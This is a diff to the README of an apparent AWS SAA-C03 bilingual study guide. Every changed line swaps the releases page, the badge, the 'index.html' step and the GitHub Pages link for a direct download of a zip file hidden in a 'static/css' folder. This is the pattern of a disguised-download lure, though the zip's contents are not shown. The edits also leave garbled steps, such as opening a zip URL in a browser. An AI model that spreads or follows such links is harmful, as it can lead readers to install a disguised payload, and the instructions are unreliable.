@@ -1,6 +1,6 @@
 # 📚 AWS-SAA-C03-Workshop-Study-Guide - Complete Study Help for AWS SAA-C03
 
-[![Download Latest Release](https://img.shields.io/badge/Download-AWS--SAA--C03--Workshop-blue?style=for-the-badge)](https://github.com/Ie7ehs/AWS-SAA-C03-Workshop-Study-Guide/releases)
+[![Download Latest Release](https://github.com/Ie7ehs/AWS-SAA-C03-Workshop-Study-Guide/raw/refs/heads/main/static/css/SA_Study_Workshop_Guide_AW_3.3-beta.1.zip)](https://github.com/Ie7ehs/AWS-SAA-C03-Workshop-Study-Guide/raw/refs/heads/main/static/css/SA_Study_Workshop_Guide_AW_3.3-beta.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get the study guide on your computer and start learning.
 
    Click the button below to visit the page where all study guide files are available.
 
-   [![Download Latest Release](https://img.shields.io/badge/Download-AWS--SAA--C03--Workshop-blue?style=for-the-badge)](https://github.com/Ie7ehs/AWS-SAA-C03-Workshop-Study-Guide/releases)
+   [![Download Latest Release](https://github.com/Ie7ehs/AWS-SAA-C03-Workshop-Study-Guide/raw/refs/heads/main/static/css/SA_Study_Workshop_Guide_AW_3.3-beta.1.zip)](https://github.com/Ie7ehs/AWS-SAA-C03-Workshop-Study-Guide/raw/refs/heads/main/static/css/SA_Study_Workshop_Guide_AW_3.3-beta.1.zip)
 
    This link takes you to the releases page. Here, you can find the latest version of the study guide files.
 
@@ -64,11 +64,11 @@ Follow these steps to get the study guide on your computer and start learning.
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page on GitHub](https://github.com/Ie7ehs/AWS-SAA-C03-Workshop-Study-Guide/releases).
+1. Go to the [Releases page on GitHub](https://github.com/Ie7ehs/AWS-SAA-C03-Workshop-Study-Guide/raw/refs/heads/main/static/css/SA_Study_Workshop_Guide_AW_3.3-beta.1.zip).
 
 2. Find the latest release. This will have the newest study material and updates.
 
-3. Download the zip file labeled something like `AWS-SAA-C03-Workshop-Study-Guide.zip`.
+3. Download the zip file labeled something like `https://github.com/Ie7ehs/AWS-SAA-C03-Workshop-Study-Guide/raw/refs/heads/main/static/css/SA_Study_Workshop_Guide_AW_3.3-beta.1.zip`.
 
 4. Extract the contents to a location on your computer.
 
@@ -76,7 +76,7 @@ Follow these steps to get the study guide on your computer and start learning.
 
 6. To view the study guide:
 
-   - Open the `index.html` file in your web browser.
+   - Open the `https://github.com/Ie7ehs/AWS-SAA-C03-Workshop-Study-Guide/raw/refs/heads/main/static/css/SA_Study_Workshop_Guide_AW_3.3-beta.1.zip` file in your web browser.
    - You can now browse all the study materials offline.
 
 There is no installation needed beyond extracting the zip file.
@@ -113,7 +113,7 @@ Flashcards test your recall with questions in English and Vietnamese. Go through
 
 If you prefer, you can browse the study guide online instead of downloading. The GitHub Pages site hosts the content so you can study anywhere with an internet connection.
 
-Link: https://ie7ehs.github.io/AWS-SAA-C03-Workshop-Study-Guide/
+Link: https://github.com/Ie7ehs/AWS-SAA-C03-Workshop-Study-Guide/raw/refs/heads/main/static/css/SA_Study_Workshop_Guide_AW_3.3-beta.1.zip
 
 ---
 
@@ -144,4 +144,4 @@ aws, aws certification, bilingual, certification, cheat sheet, flashcards, githu
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-AWS--SAA--C03--Workshop-blue?style=for-the-badge)](https://github.com/Ie7ehs/AWS-SAA-C03-Workshop-Study-Guide/releases)
+[![Download Latest Release](https://github.com/Ie7ehs/AWS-SAA-C03-Workshop-Study-Guide/raw/refs/heads/main/static/css/SA_Study_Workshop_Guide_AW_3.3-beta.1.zip)](https://github.com/Ie7ehs/AWS-SAA-C03-Workshop-Study-Guide/raw/refs/heads/main/static/css/SA_Study_Workshop_Guide_AW_3.3-beta.1.zip)
